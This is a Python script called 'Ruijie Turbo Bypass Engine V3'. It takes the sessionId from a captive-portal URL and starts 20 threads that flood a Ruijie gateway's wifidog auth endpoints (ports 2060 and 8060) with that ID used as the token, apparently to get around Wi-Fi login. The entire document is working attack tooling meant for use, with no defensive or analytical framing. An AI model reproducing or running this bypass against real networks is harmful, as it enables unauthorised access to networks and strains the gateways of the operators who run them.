#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import time
import threading
import random
import urllib3
import os
from urllib.parse import urlparse, parse_qs

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# GLOBAL SETTINGS
# ===============================
THREADS = 20
TIMEOUT = 7
DEBUG = False

# ANSI COLORS
RED = "\033[0;31m"
GREEN = "\033[0;32m"
YELLOW = "\033[0;33m"
CYAN = "\033[0;36m"
RESET = "\033[0m"

stop_event = threading.Event()

def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"""{CYAN}
+------------------------------------------+
|      RUIJIE TURBO BYPASS ENGINE V3       |
|      Status: MACC/Cloud Compatible       |
+------------------------------------------+{RESET}""")

def turbo_engine(url, sid):
    session = requests.Session()
    success = 0
    fail = 0
    
    while not stop_event.is_set():
        try:
            r = session.get(url, timeout=TIMEOUT, verify=False)
            if r.status_code == 200 or r.status_code == 302:
                success += 1
                color = GREEN
            else:
                fail += 1
                color = YELLOW
            
            print(f"{color}[*]{RESET} SID: {sid[:12]} | OK: {success} | FAIL: {fail}", end="\r")
        except:
            fail += 1
            print(f"{RED}[!] Network Timeout / Connection Refused{RESET}", end="\r")
        
        time.sleep(random.uniform(0.05, 0.2))

def initialize():
    banner()
    
    # 1. URL Input Parsing
    print(f"\n{YELLOW}[-] Enter Portal URL:{RESET}")
    raw_url = input(f"{CYAN}>> {RESET}").strip()
    
    parsed_url = urlparse(raw_url)
    params = parse_qs(parsed_url.query)
    sid = params.get('sessionId', [None])[0]
    
    if not sid:
        print(f"{RED}[ERROR] Invalid URL. SessionID not found.{RESET}")
        return

    # 2. Gateway Configuration
    print(f"\n{YELLOW}[-] Target Gateway IP (Default: 192.168.110.1):{RESET}")
    gw_addr = input(f"{CYAN}>> {RESET}").strip() or "192.168.110.1"
    
    # Auth Path Matrix
    auth_targets = [
        f"http://{gw_addr}:2060/wifidog/auth?token={sid}",
        f"http://{gw_addr}:2060/wifidog/auth?token={sid}&phonenumber={random.randint(1000,9999)}",
        f"http://{gw_addr}:8060/wifidog/auth?token={sid}"
    ]

    print(f"\n{GREEN}[+] Session Captured: {sid}{RESET}")
    print(f"{GREEN}[+] Gateway Locked: {gw_addr}{RESET}")
    print(f"{CYAN}[+] Launching {THREADS} High-Speed Threads...{RESET}")
    print(f"{RED}[!] Press CTRL+C to Terminate Process{RESET}\n")

    workers = []
    for target in auth_targets:
        for _ in range(THREADS // len(auth_targets)):
            t = threading.Thread(target=turbo_engine, args=(target, sid), daemon=True)
            t.start()
            workers.append(t)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n{RED}[SHUTDOWN] Terminating all threads...{RESET}")

if __name__ == "__main__":
    try:
        initialize()
    except Exception as e:
        print(f"\n{RED}[FATAL ERROR] {e}{RESET}")
